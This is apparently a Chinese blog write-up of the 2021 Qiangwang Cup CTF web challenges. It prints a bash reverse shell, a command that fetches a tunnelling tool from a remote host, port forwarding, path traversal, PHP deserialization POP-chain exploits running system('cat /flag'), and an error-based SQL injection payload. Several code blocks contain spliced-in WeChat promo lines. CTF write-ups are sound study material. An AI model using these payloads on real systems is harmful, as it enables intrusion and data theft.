<!--yml
category: 未分类
date: 2022-04-26 14:53:53
-->

# 2021强网杯Write-Up真题解析之WEB部分（暴力干货，建议收藏）_代码熬夜敲的博客-CSDN博客_强网杯题目

> 来源：[https://blog.csdn.net/MachineGunJoe/article/details/117955863](https://blog.csdn.net/MachineGunJoe/article/details/117955863)

# ![](img/4f9fd6db5ae0558d024401d11395267b.png)

# 前言：

强网杯作为国内最好的CTF比赛之一，搞安全的博友和初学者都可以去尝试下。首先，里面有很多大神队伍，0x300R、eee、0ops、AAA、NeSE、Nu1L等，真的值得我们去学习。其次，非常感谢强网杯的主办方，这么好的比赛离不开许多师傅们的辛苦，我们应该感恩这么高质量比赛的幕后工作者。最后，作为一枚安全菜鸡，就让我简单复现下本次比赛的Web题目。不喜勿喷，欢迎指正~

![在这里插入图片描述](img/553ec6a4dc72766e929c27158ef87e92.png)

**目录**

[前言：](#main-toc)

[比赛信息](#%E6%AF%94%E8%B5%9B%E4%BF%A1%E6%81%AF)

[WEB部分](#WEB%E9%83%A8%E5%88%86)

[Hard_Penetration](#Hard_Penetration)

[收集到的信息有：](#%E6%94%B6%E9%9B%86%E5%88%B0%E7%9A%84%E4%BF%A1%E6%81%AF%E6%9C%89%EF%BC%9A)

[php上传ew：](#php%E4%B8%8A%E4%BC%A0ew%EF%BC%9A)

[转发端口：](#%E8%BD%AC%E5%8F%91%E7%AB%AF%E5%8F%A3%EF%BC%9A)

[任意文件读拿flag：](#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E6%8B%BFflag%EF%BC%9A)

[pop_master](#pop_master)

[16万行代码，从12点看到3点，就硬看：](#16%E4%B8%87%E8%A1%8C%E4%BB%A3%E7%A0%81%EF%BC%8C%E4%BB%8E12%E7%82%B9%E7%9C%8B%E5%88%B03%E7%82%B9%EF%BC%8C%E5%B0%B1%E7%A1%AC%E7%9C%8B%EF%BC%9A)

[Exp：](#Exp%EF%BC%9A)

[[强网先锋]赌徒](#%5B%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B%5D%E8%B5%8C%E5%BE%92)

[[强网先锋]寻宝](#%5B%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B%5D%E5%AF%BB%E5%AE%9D)

[该网站打开如下图所示：](#%E8%AF%A5%E7%BD%91%E7%AB%99%E6%89%93%E5%BC%80%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA%EF%BC%9A)

[线索一](#%E7%BA%BF%E7%B4%A2%E4%B8%80)

[线索二](#%E7%BA%BF%E7%B4%A2%E4%BA%8C)

[EasyWeb](#EasyWeb)

[无过滤，直接报错注入出密码:](#%E6%97%A0%E8%BF%87%E6%BB%A4%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BA%E5%AF%86%E7%A0%81%3A)

[站里面有个file路径，存在文件上传，简单绕一下过滤：](#%E7%AB%99%E9%87%8C%E9%9D%A2%E6%9C%89%E4%B8%AAfile%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%8C%E7%AE%80%E5%8D%95%E7%BB%95%E4%B8%80%E4%B8%8B%E8%BF%87%E6%BB%A4%EF%BC%9A)

[依旧是拿ew转发，发现是个默认界面，直接拿网上现成脚本一把梭：](#%E4%BE%9D%E6%97%A7%E6%98%AF%E6%8B%BFew%E8%BD%AC%E5%8F%91%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AF%E4%B8%AA%E9%BB%98%E8%AE%A4%E7%95%8C%E9%9D%A2%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%BF%E7%BD%91%E4%B8%8A%E7%8E%B0%E6%88%90%E8%84%9A%E6%9C%AC%E4%B8%80%E6%8A%8A%E6%A2%AD%EF%BC%9A)

[福利分享：](#%E7%A6%8F%E5%88%A9%E5%88%86%E4%BA%AB%EF%BC%9A)

[→【资料获取】←](#%E2%86%92%E3%80%90%E8%B5%84%E6%96%99%E8%8E%B7%E5%8F%96%E3%80%91%E2%86%90)

* * *

# **比赛信息**

![在这里插入图片描述](img/b01099935d5c65b6e80c2e1de348c1fb.png)

# **WEB部分**

## **Hard_Penetration**

***题目内容：渗透测试主要以获取权限为主，这一次，你能获取到什么权限呢。***

前面是一个shiro反序列化，脚本都能打通，弹个shell：

```
bash -c 'bash -i >/dev/tcp/vps/port 2>&10>&1'
```

### 收集到的信息有：

### php上传ew：

```
php -r "file_put_contents('ew',file_get_contents('http://xps/ew_linux_x64'));"
```

### 转发端口：

```
./ew_linux_x64 -s lcx_listen -l 18888 -e 18889

./ew -s lcx_slave -d vps -e 18889 -f  127.0.0.1 -g 8005

+WX:machinegunjoe666免费获取资料
```

### 任意文件读拿flag：

```
/wap/common/show?templateFile=../../../../../../flag
```

## **pop_master**

*题目内容：听说你是**pop**链构建大师？*

![](img/5bd336fac4309cf20101d6aa5bc73359.png)

### **16万行代码，从12点看到3点，就硬看：**

```
<?php

include "class.php";

$o = new cdKBgX();
$b = "phpinfo();//";

$o->IG2X7eS = new guAeB0;
$o->IG2X7eS->LTo0wOs = new MZ2dMV;
$o->IG2X7eS->LTo0wOs->WU6aUWm = new nXKQYP;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd = new r6lSwy;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac = new UW5vkV;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f = new DqoC5G;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X = new TBFTL7;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H = new qoEd8u;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX = new fFEGgM;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL = new rn4PNR;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS = new pRM5G8;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m = new Bwn3ZW;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m->PmYsubO = new saCGME;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m->PmYsubO->c449DBi = new ubPVyV;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m->PmYsubO->c449DBi->lgNpoOl = new b8WIcp;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m->PmYsubO->c449DBi->lgNpoOl->OkOSSwp = new q4IoOD;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m->PmYsubO->c449DBi->lgNpoOl->OkOSSwp->Wqcdf7d = new be3fZl;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m->PmYsubO->c449DBi->lgNpoOl->OkOSSwp->Wqcdf7d->NaHb7Ac = new x9wgH7;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m->PmYsubO->c449DBi->lgNpoOl->OkOSSwp->Wqcdf7d->NaHb7Ac->IBILkhN = new Upele5;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m->PmYsubO->c449DBi->lgNpoOl->OkOSSwp->Wqcdf7d->NaHb7Ac->IBILkhN->cl73VwG = new uQhKsL;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m->PmYsubO->c449DBi->lgNpoOl->OkOSSwp->Wqcdf7d->NaHb7Ac->IBILkhN->cl73VwG->RwqayHu = new G6QyEc;
$o->IG2X7eS->LTo0wOs->WU6aUWm->mGpVYwd->q6VMPac->XlZSk2f->qd1Gk6X->z2qMn5H->BmsS1eX->uXVxFLL->TdVPKPS->k6WTa5m->PmYsubO->c449DBi->lgNpoOl->OkOSSwp->Wqcdf7d->NaHb7Ac->IBILkhN->cl73VwG->RwqayHu->Ew9nqoI = new BmAQQY;

+WX:machinegunjoe666免费获取资料

echo serialize($o); 
```

### **Exp：**

```
http://eci-2zeir9lncwqmfgk2txz6.cloudeci1.ichunqiu.com/?pop=O:6:"cdKBgX":1:
{s:7:"IG2X7eS";O:6:"guAeB0":1:{s:7:"LTo0wOs";O:6:"MZ2dMV":1:{s:7:"WU6aUWm";O:6:"nXKQYP":1:{s:7:"mGpVYwd";O:6:"r6lSwy":1:{s:7:"q6VMPac";O:6:"UW5vkV":1:{s:7:"XlZSk2f";O:6:"DqoC5G":1:{s:7:"qd1Gk6X";O:6:"TBFTL7":1:{s:7:"z2qMn5H";O:6:"qoEd8u":1:{s:7:"BmsS1eX";O:6:"fFEGgM":1:{s:7:"uXVxFLL";O:6:"rn4PNR":1:{s:7:"TdVPKPS";O:6:"pRM5G8":1:{s:7:"k6WTa5m";O:6:"Bwn3ZW":1:{s:7:"PmYsubO";O:6:"saCGME":1:{s:7:"c449DBi";O:6:"ubPVyV":1:{s:7:"lgNpoOl";O:6:"b8WIcp":1:{s:7:"OkOSSwp";O:6:"q4IoOD":1:{s:7:"Wqcdf7d";O:6:"be3fZl":1:{s:7:"NaHb7Ac";O:6:"x9wgH7":1:{s:7:"IBILkhN";O:6:"Upele5":1:{s:7:"cl73VwG";O:6:"uQhKsL":1:{s:7:"RwqayHu";O:6:"G6QyEc":1:{s:7:"Ew9nqoI";O:6:"BmAQQY":1:{s:7:"UFAlT9K";N;}}}}}}}}}}}}}}}}}}}}}}}&argv=system("cat /flag");// 
```

![2021第五届强网杯全国网络安全挑战赛线上赛 Write-Up](img/ec1f737562c4d6ce5bd7270d96a409df.png)

## **[强网先锋]赌徒**

![在这里插入图片描述](img/6ae3a2f943f9ac014ec7d5b02510524a.png)

存在www.zip

存在反序列化漏洞，很容易找到pop链

```
<?php

class Start
{
    public $name='guest';
    public $flag='';

}

class Info
{
    public $promise='I do';
    public $file=[];

}+WX:machinegunjoe666免费获取资料

class Room
{
    public $filename='/flag';
    public $sth_to_set;
    public $a='';

}
$s=new Start();
$i=new Info();
$r=new Room();
$r1=new Room();
$s->name=$i;
$i->file["filename"]=$r;
$r->a=$r1;
$r1->filename="/flag";
print(serialize($s));

?>
```

将上面生成的序列化字符串，传入hello，即可得hi+flag的base64编码，解码即可得flag

```
/?hello=O:5:"Start":2:{s:4:"name";O:4:"Info":2:{s:7:"promise";s:4:"Ido";s:4:"file";a:1:{s:8:"filename";O:4:"Room":3:{s:8:"filename";s:5:"/flag";s:10:"sth_to_set";N;s:1:"a";O:4:"Room":3:{s:8:"filename";s:5:"/flag";s:10:"sth_to_set";N;s:1:"a";s:0:"";}}}}s:4:"flag";s:0:"";}
```

![2021第五届强网杯全国网络安全挑战赛线上赛 Write-Up](img/79cc529a7677ce24fc4c86d6924493a8.png)

![2021第五届强网杯全国网络安全挑战赛线上赛 Write-Up](img/c8c5c91c687767fc42ddd2c37ab124bb.png)

## **[强网先锋]寻宝**

![在这里插入图片描述](img/a606886e87e419b5651026abbed565b3.png)

### 该网站打开如下图所示：

![在这里插入图片描述](img/74b7dee5f7c9efcbfd64b2b5d3843e0a.png)

### **线索一**

```
ppp[number1]=1025a&ppp[number2]=1e6&ppp[number3]=61823470&ppp[number4]=kawhika&ppp[number5]=kawhi
```

```
KEY1{e1e1d3d40573127e9ee0480caf1283d6}
```

### **线索二**

在下载下来的文件寻找到`KEY2`

![2021第五届强网杯全国网络安全挑战赛线上赛 Write-Up](img/35f33fc43faeb31e4400fd4783e59c66.png)

两个`KEY1`和`KEY2`在页面输入即可获取`flag`

## **EasyWeb**

![在这里插入图片描述](img/6388b1296aaba3389a7e967df9b3bdac.png)

![](img/81f546a9c5d3f27f6ce4850035bbf1e9.png)

首先在：http://47.104.136.46/files/拿到hint:

```
Try to scan 35000-40000 ^_^.

All tables are empty except for the table where theusername and password are located

Table: employee

扫下端口在36842。

提示:

<!-- table: employee -->
```

### 无过滤，直接报错注入出密码:

```
password=admin&username=admin'or1=extractvalue(1,concat(0x7e,mid((select password from employee),16)))#

admin/99f609527226e076d668668582ac4420
```

### 站里面有个file路径，存在文件上传，简单绕一下过滤：

![2021第五届强网杯全国网络安全挑战赛线上赛 Write-Up](img/a1a31e22d7776b974ca872fc554f87d6.png)

写shell后ps -ef看到内网有个jboss，8006端口。

### 依旧是拿ew转发，发现是个默认界面，直接拿网上现成脚本一把梭：

![2021第五届强网杯全国网络安全挑战赛线上赛 Write-Up](img/faca76ea190d38b51f17781502396b5a.png)

# 福利分享：

![](img/45d8ffb933bd073fd082e9c7b276fc7d.png)​

看到这里的大佬，动动发财的小手 **点赞 + 回复 + 收藏，能【 关注 】**一波就更好了

我是一名渗透测试工程师，为了感谢读者们，我想把我收藏的一些CTF夺旗赛干货贡献给大家，回馈每一个读者，希望能帮到你们。

**干货主要有：**

①1000+CTF历届题库（主流和经典的应该都有了）

②CTF技术文档（最全中文版）

③项目源码（四五十个有趣且经典的练手项目及源码）

④ CTF大赛、web安全、渗透测试方面的视频（适合小白学习）

⑤ 网络安全学习路线图（告别不入流的学习）

⑥ CTF/渗透测试工具镜像文件大全

⑦ 2021密码学/隐身术/PWN技术手册大全

各位朋友们可以关注+评论一波 然后点击下方   即可免费获取全部资料